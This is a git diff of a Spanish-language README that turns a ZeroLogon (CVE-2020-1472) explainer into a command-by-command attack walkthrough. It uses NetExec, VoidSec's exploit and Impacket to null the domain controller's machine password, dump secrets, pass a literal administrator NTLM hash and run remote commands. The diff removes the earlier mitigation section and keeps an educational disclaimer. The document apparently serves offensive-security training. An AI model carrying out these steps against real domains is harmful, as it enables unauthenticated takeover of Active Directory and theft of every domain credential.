@@ -1,117 +1,164 @@
-# Ataque ZeroLogon (CVE-2020-1472) - Explicación paso a paso
+# 📌 Ataque ZeroLogon (CVE-2020-1472)
 
-Este repositorio contiene una explicación detallada para entender y ejecutar el ataque **ZeroLogon** contra un controlador de dominio vulnerable de Active Directory, utilizando el exploit disponible en el repositorio de [VoidSec/CVE-2020-1472](https://github.com/VoidSec/CVE-2020-1472).
-
----
-
-## ¿Qué es ZeroLogon?
-
-ZeroLogon es una vulnerabilidad crítica (CVE-2020-1472) que afecta el protocolo Netlogon de Microsoft. Permite a un atacante sin autenticación obtener acceso completo de administrador al controlador de dominio de Active Directory explotando un fallo en el proceso de autenticación basado en AES-CFB8.
+Este repositorio documenta paso a paso cómo ejecutar el ataque **ZeroLogon** utilizando `NetExec` (antes CrackMapExec), el exploit de [VoidSec](https://github.com/VoidSec/CVE-2020-1472) y herramientas de Impacket.
 
 ---
 
-## Requisitos
+## ⚠️ Importante
 
-- Controlador de dominio vulnerable (sin parche contra CVE-2020-1472).
+> Esta guía es solo para fines **educativos** y debe usarse únicamente en laboratorios controlados con permiso explícito. **NO** ejecutes este procedimiento en redes productivas.
+
+---
+
+## ⚙️ Requisitos
+
+- Controlador de dominio sin parches para CVE-2020-1472.
 - Máquina atacante con:
-  - Sistema Linux (o WSL en Windows).
-  - Python 3 instalado.
-  - Acceso a la red donde está el controlador de dominio.
+  - Linux o WSL.
+  - Python 3.
+  - NetExec (`nxc`), Impacket y Git instalados.
 
 ---
 
-## Paso 1: Preparar la máquina atacante
+## 🧭 Paso a paso del ataque
+
+### 1. Verificar conectividad SMB con el DC
 
 ```bash
-sudo apt update
-sudo apt install git python3 python3-pip -y
+nxc smb [IP_DEL_SERVER_AD]
+```
+
+Repetir si es necesario para confirmar acceso:
+
+```bash
+nxc smb [IP_DEL_SERVER_AD]
 ```
 
 ---
 
-## Paso 2: Clonar el repositorio del exploit
+### 2. Explotar ZeroLogon con NetExec
 
 ```bash
-git clone https://github.com/VoidSec/CVE-2020-1472.git
+nxc smb [IP_DEL_SERVER_AD] -u '' -p '' -M zerologon
+```
+
+Este módulo intenta autenticar usando claves nulas y explotar la vulnerabilidad en Netlogon.
+
+---
+
+### 3. Clonar el exploit de VoidSec
+
+```bash
+git clone https://github.com/VoidSec/CVE-2020-1472
 cd CVE-2020-1472
 ```
 
 ---
 
-## Paso 3: Instalar dependencias Python
+### 4. Cambiar la contraseña de la cuenta de equipo del DC
 
 ```bash
-pip3 install -r requirements.txt
+python3 cve-2020-1472-exploit.py
+```
+
+O usar argumentos manuales:
+
+```bash
+python3 cve-2020-1472-exploit.py -t [IP_DEL_SERVER_AD] -n [NOMBRE_DEL_SERVER_AD]
 ```
 
 ---
 
-## Paso 4: Verificar vulnerabilidad del controlador de dominio (opcional)
+### 5. Volcar hashes con Impacket
 
 ```bash
-python3 check.py <IP_del_controlador_de_dominio>
+impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_SERVER_AD]$@[IP_DEL_SERVER_AD]'
 ```
 
-Si el resultado indica que el controlador es vulnerable, puedes continuar.
+Esto permite obtener los secretos de LSA y hash de administrador.
 
 ---
 
-## Paso 5: Ejecutar el exploit para resetear la contraseña del DC
+### 6. Validar acceso como máquina y luego como administrador
 
 ```bash
-python3 exploit.py <IP_del_controlador_de_dominio> <Nueva_contraseña_para_DC>
+nxc smb [IP_DEL_SERVER_AD] -u '[NOMBRE_DEL_SERVER_AD]$' -p '' --lsa
 ```
 
-Ejemplo:
+Con hash de administrador (por ejemplo):
 
 ```bash
-python3 exploit.py 192.168.1.100 Password123!
+nxc smb [IP_DEL_SERVER_AD] -u '[USUARIO_ADMINISTRADOR]' -H '[HASH_DE_ADMINISTRADOR]' --lsa
 ```
 
 ---
 
-## Paso 6: Verificar que la contraseña cambió y acceso administrativo
-
-Puedes probar conectarte con la nueva contraseña usando `rpcclient`:
+### 7. Restaurar la contraseña original del DC (opcional)
 
 ```bash
-rpcclient -U Administrator%Password123! 192.168.1.100
+python3 reinstall_original_pw.py
 ```
 
-Si te conecta, tienes acceso administrativo al dominio.
+O con argumentos:
+
+```bash
+python3 reinstall_original_pw.py [NOMBRE_DEL_SERVER_AD]$ [IP_DEL_SERVER_AD] [HASH_LARGO]
+```
 
 ---
 
-## ¿Qué sucede durante el ataque?
+### 8. Validar acceso final con hash NTLM
 
-- El exploit envía paquetes Netlogon con claves nulas para "engañar" al controlador de dominio.
-- Debido a un error criptográfico en Netlogon, el DC acepta la sesión sin validar la clave.
-- El atacante puede cambiar la contraseña del DC y obtener privilegios de administrador.
-
----
-
-## Medidas de mitigación
-
-- Aplicar los parches oficiales de Microsoft desde agosto 2020.
-- Monitorizar eventos sospechosos en logs de Netlogon (Event ID 5827, 5828).
-- Limitar el acceso a los controladores de dominio desde la red.
+```bash
+impacket-secretsdump '[NOMBRE_DEL_DOMINIO_AD]/[NOMBRE_DEL_SERVER_AD]$@[IP_DEL_SERVER_AD]'
+```
 
 ---
 
-## Referencias
+### 9. Ejecutar comando remoto como administrador
 
-- [CVE-2020-1472 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-1472)
-- [VoidSec/CVE-2020-1472 GitHub](https://github.com/VoidSec/CVE-2020-1472)
-- [Microsoft Security Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472)
-
----
-
-## Aviso Legal
-
-Esta información es solo para fines educativos y debe usarse únicamente en entornos controlados con permiso explícito. El uso no autorizado puede ser ilegal y conllevar consecuencias legales.
+```bash
+nxc smb [IP_DEL_SERVER_AD] -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' -x whoami
+```
 
 ---
 
-# Autor
+## 🧪 ¿Qué hicimos?
 
-Explicación preparada por [Tu Nombre] para fines educativos y formativos.
+- Usamos `nxc` para aprovechar la vulnerabilidad en Netlogon.
+- Reemplazamos la contraseña de la cuenta del DC con una contraseña nula.
+- Extraímos hashes y secretos del sistema.
+- Accedimos remotamente como administrador de dominio.
+- Finalmente restauramos el estado original (opcional).
+
+---
+
+## 📚 Referencias
+
+- [ZeroLogon CVE-2020-1472 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-1472)
+- [VoidSec CVE-2020-1472 Exploit](https://github.com/VoidSec/CVE-2020-1472)
+- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec)
+- [Impacket](https://github.com/SecureAuthCorp/impacket)
+
+------
+
+## 🚨 Advertencia
+
+### Riesgo crítico: el AD puede romperse
+El exploit ZeroLogon cambia la contraseña de la cuenta de máquina del controlador de dominio (DC01$). Si no se restaura rápidamente, el controlador ya no podrá autenticarse ni replicarse con otros DCs.
+
+Esto puede:
+
+Romper la replicación del Active Directory.
+
+Causar fallos en políticas, usuarios y servicios.
+
+Obligar a restaurar el dominio desde backups.
+
+### 🛑 Siempre restaurá la contraseña original del DC antes de que se sincronice con otros controladores.
+
+---
+
+## 👤 Autor
+
+Explicación elaborada por [Sebastian Peinador](https://www.linkedin.com/in/sebastian-j-peinador/) para propósitos didácticos y de investigación en ciberseguridad ofensiva.
